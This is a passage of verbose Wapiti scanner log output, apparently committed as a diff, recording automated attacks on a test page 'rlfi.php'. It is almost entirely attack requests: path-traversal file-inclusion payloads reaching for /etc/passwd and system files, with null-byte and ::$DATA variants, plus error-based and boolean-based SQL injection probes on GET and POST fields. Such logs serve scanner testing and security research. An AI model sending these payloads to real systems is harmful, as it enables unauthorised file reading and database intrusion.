+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:55:54.346 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:55:54.358 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:55:54.369 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:55:54.380 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:54.392 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:54.403 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=rlfi.php
+2024-03-20 16:55:54.414 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=rlfi.php%00
+2024-03-20 16:55:54.426 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=rlfi.php%3A%3A%24DATA
+2024-03-20 16:55:54.463 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 16:55:54.482 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:54.483 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/rlfi.php?language=fuzz%C2%BF%27%22%28&action=go (0)
+2024-03-20 16:55:54.507 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/rlfi.php?language=fuzz&action=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 16:55:54.568 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz%20AND%2013%3D70%20AND%2082%3D82&action=go (0)
+2024-03-20 16:55:54.632 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz%27%20AND%2077%3D160%20AND%20%2787%27%3D%2787&action=go (0)
+2024-03-20 16:55:54.663 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz%22%20AND%2096%3D112%20AND%20%2266%22%3D%2266&action=go (0)
+2024-03-20 16:55:54.694 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz%29%20AND%2095%3D182%20AND%20%2810%3D10&action=go (0)
+2024-03-20 16:55:54.726 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz%27%29%20AND%2095%3D120%20AND%20%28%2762%27%3D%2762&action=go (0)
+2024-03-20 16:55:54.759 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz%22%29%20AND%2024%3D99%20AND%20%28%2279%22%3D%2279&action=go (0)
+2024-03-20 16:55:54.791 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%20AND%2059%3D123%20AND%2063%3D63 (0)
+2024-03-20 16:55:54.822 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%27%20AND%2032%3D131%20AND%20%2795%27%3D%2795 (0)
+2024-03-20 16:55:54.855 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%22%20AND%2081%3D165%20AND%20%2255%22%3D%2255 (0)
+2024-03-20 16:55:54.888 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%29%20AND%2025%3D76%20AND%20%2893%3D93 (0)
+2024-03-20 16:55:54.922 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%27%29%20AND%2014%3D36%20AND%20%28%2776%27%3D%2776 (0)
+2024-03-20 16:55:54.952 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%22%29%20AND%2065%3D126%20AND%20%28%2247%22%3D%2247 (0)
+2024-03-20 16:55:54.992 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?action=go&language=lang_nl.php (1)
+2024-03-20 16:55:54.992 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/rlfi.php?action=go%C2%BF%27%22%28&language=lang_nl.php (1)
+2024-03-20 16:55:55.008 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/rlfi.php?action=go&language=go%C2%BF%27%22%28 (1)
+2024-03-20 16:55:55.043 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go%20AND%2099%3D182%20AND%2082%3D82&language=lang_nl.php (1)
+2024-03-20 16:55:55.070 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go%27%20AND%2071%3D166%20AND%20%2794%27%3D%2794&language=lang_nl.php (1)
+2024-03-20 16:55:55.097 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go%22%20AND%2013%3D50%20AND%20%2297%22%3D%2297&language=lang_nl.php (1)
+2024-03-20 16:55:55.124 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go%29%20AND%2058%3D141%20AND%20%2884%3D84&language=lang_nl.php (1)
+2024-03-20 16:55:55.151 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go%27%29%20AND%2027%3D46%20AND%20%28%2765%27%3D%2765&language=lang_nl.php (1)
+2024-03-20 16:55:55.177 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go%22%29%20AND%2063%3D135%20AND%20%28%2221%22%3D%2221&language=lang_nl.php (1)
+2024-03-20 16:55:55.207 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%20AND%2061%3D90%20AND%2073%3D73 (1)
+2024-03-20 16:55:55.233 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%20AND%2032%3D99%20AND%2041%3D41 (1)
+2024-03-20 16:55:55.258 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%20AND%2080%3D80%20AND%2091%3D91 (1)
+2024-03-20 16:55:55.286 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%27%20AND%2032%3D92%20AND%20%2764%27%3D%2764 (1)
+2024-03-20 16:55:55.311 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%27%20AND%2068%3D92%20AND%20%2780%27%3D%2780 (1)
+2024-03-20 16:55:55.339 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%27%20AND%2019%3D19%20AND%20%2740%27%3D%2740 (1)
+2024-03-20 16:55:55.365 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%22%20AND%2047%3D79%20AND%20%2268%22%3D%2268 (1)
+2024-03-20 16:55:55.392 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%22%20AND%2057%3D149%20AND%20%2298%22%3D%2298 (1)
+2024-03-20 16:55:55.419 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%22%20AND%2068%3D68%20AND%20%2264%22%3D%2264 (1)
+2024-03-20 16:55:55.446 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%29%20AND%2081%3D112%20AND%20%2875%3D75 (1)
+2024-03-20 16:55:55.475 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%29%20AND%2014%3D38%20AND%20%2839%3D39 (1)
+2024-03-20 16:55:55.502 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%29%20AND%2082%3D82%20AND%20%2853%3D53 (1)
+2024-03-20 16:55:55.530 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%27%29%20AND%2035%3D114%20AND%20%28%2735%27%3D%2735 (1)
+2024-03-20 16:55:55.557 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%27%29%20AND%2075%3D127%20AND%20%28%2798%27%3D%2798 (1)
+2024-03-20 16:55:55.583 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%27%29%20AND%2069%3D69%20AND%20%28%2799%27%3D%2799 (1)
+2024-03-20 16:55:55.611 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%22%29%20AND%2043%3D105%20AND%20%28%2242%22%3D%2242 (1)
+2024-03-20 16:55:55.639 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%22%29%20AND%2074%3D105%20AND%20%28%2272%22%3D%2272 (1)
+2024-03-20 16:55:55.671 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%22%29%20AND%2026%3D26%20AND%20%28%2259%22%3D%2259 (1)
+2024-03-20 16:55:55.709 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php (1)
+2024-03-20 16:55:55.738 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109
+2024-03-20 16:55:55.738 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%C2%BF%27%22%28&bug=109
+2024-03-20 16:55:55.745 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%C2%BF%27%22%28
+2024-03-20 16:55:55.759 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%20AND%2021%3D34%20AND%2075%3D75&bug=109
+2024-03-20 16:55:55.766 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%27%20AND%2094%3D169%20AND%20%2744%27%3D%2744&bug=109
+2024-03-20 16:55:55.777 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%22%20AND%2042%3D130%20AND%20%2266%22%3D%2266&bug=109
+2024-03-20 16:55:55.785 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%29%20AND%2060%3D143%20AND%20%2853%3D53&bug=109
+2024-03-20 16:55:55.793 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%27%29%20AND%2088%3D166%20AND%20%28%2748%27%3D%2748&bug=109
+2024-03-20 16:55:55.801 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%22%29%20AND%2082%3D176%20AND%20%28%2246%22%3D%2246&bug=109
+2024-03-20 16:55:55.809 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%20AND%2074%3D125%20AND%2098%3D98
+2024-03-20 16:55:55.817 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%20AND%2025%3D41%20AND%2060%3D60
+2024-03-20 16:55:55.825 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%20AND%2022%3D22%20AND%2047%3D47
+2024-03-20 16:55:55.833 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%27%20AND%2042%3D124%20AND%20%2741%27%3D%2741
+2024-03-20 16:55:55.842 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%27%20AND%2071%3D166%20AND%20%2785%27%3D%2785
+2024-03-20 16:55:55.850 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%27%20AND%2085%3D85%20AND%20%2713%27%3D%2713
+2024-03-20 16:55:55.857 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%22%20AND%2073%3D84%20AND%20%2258%22%3D%2258
+2024-03-20 16:55:55.864 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%22%20AND%2056%3D97%20AND%20%2276%22%3D%2276
+2024-03-20 16:55:55.871 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%22%20AND%2068%3D68%20AND%20%2232%22%3D%2232
+2024-03-20 16:55:55.878 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%29%20AND%2018%3D98%20AND%20%2855%3D55
+2024-03-20 16:55:55.886 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%29%20AND%2059%3D88%20AND%20%2864%3D64
+2024-03-20 16:55:55.893 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%29%20AND%2047%3D47%20AND%20%2877%3D77
+2024-03-20 16:55:55.900 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%27%29%20AND%2032%3D91%20AND%20%28%2759%27%3D%2759
+2024-03-20 16:55:55.908 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%27%29%20AND%2099%3D113%20AND%20%28%2794%27%3D%2794
+2024-03-20 16:55:55.915 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%27%29%20AND%2090%3D90%20AND%20%28%2752%27%3D%2752
+2024-03-20 16:55:55.922 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%22%29%20AND%2067%3D82%20AND%20%28%2299%22%3D%2299
+2024-03-20 16:55:55.928 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%22%29%20AND%2051%3D148%20AND%20%28%2255%22%3D%2255
+2024-03-20 16:55:55.935 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%22%29%20AND%2043%3D43%20AND%20%28%2214%22%3D%2214
+2024-03-20 16:55:55.952 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:55.952 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%C2%BF%27%22%28&security_level=2
+2024-03-20 16:55:55.959 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=submit%C2%BF%27%22%28
+2024-03-20 16:55:55.972 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%20AND%2042%3D75%20AND%2035%3D35&security_level=2
+2024-03-20 16:55:56.067 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%27%20AND%2025%3D93%20AND%20%2768%27%3D%2768&security_level=2
+2024-03-20 16:55:56.074 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%22%20AND%2098%3D138%20AND%20%2272%22%3D%2272&security_level=2
+2024-03-20 16:55:56.081 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%29%20AND%2081%3D150%20AND%20%2817%3D17&security_level=2
+2024-03-20 16:55:56.088 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%27%29%20AND%2053%3D133%20AND%20%28%2761%27%3D%2761&security_level=2
+2024-03-20 16:55:56.095 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%22%29%20AND%2018%3D109%20AND%20%28%2246%22%3D%2246&security_level=2
+2024-03-20 16:55:56.104 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%20AND%2030%3D113%20AND%2037%3D37
+2024-03-20 16:55:56.110 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%27%20AND%2044%3D88%20AND%20%2769%27%3D%2769
+2024-03-20 16:55:56.118 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%22%20AND%2010%3D83%20AND%20%2275%22%3D%2275
+2024-03-20 16:55:56.125 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%29%20AND%2026%3D39%20AND%20%2833%3D33
+2024-03-20 16:55:56.132 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%27%29%20AND%2038%3D74%20AND%20%28%2789%27%3D%2789
+2024-03-20 16:55:56.140 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%22%29%20AND%2016%3D61%20AND%20%28%2254%22%3D%2254
+2024-03-20 16:55:56.173 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 16:55:56.183 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:56.210 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?action=go&language=lang_nl.php (1)
+2024-03-20 16:55:56.238 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php (1)
+2024-03-20 16:55:56.436 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 16:55:56.462 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//rlfi.json/
+2024-03-20 16:55:56.462 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//rlfi.json/web_03202024_1655.html with a browser to see this report.
